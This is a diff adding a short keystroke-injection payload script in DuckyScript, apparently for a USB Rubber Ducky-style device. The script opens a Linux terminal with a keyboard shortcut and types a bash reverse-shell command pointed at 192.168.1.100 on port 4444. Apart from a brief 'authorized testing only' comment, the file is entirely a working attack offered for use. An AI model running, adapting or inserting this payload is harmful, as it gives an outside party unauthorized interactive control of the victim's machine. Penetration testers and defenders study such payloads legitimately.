@@ -1,0 +1,11 @@
+REM Title: Linux Reverse Shell (Bash)
+REM Target: Linux with GNOME or terminal accessible via keyboard shortcut
+REM WARNING: For authorized testing only. Change IP and PORT.
+REM
+REM Opens a terminal and starts a reverse bash shell.
+
+DELAY 1000
+CTRL-ALT t
+DELAY 800
+STRING bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+ENTER
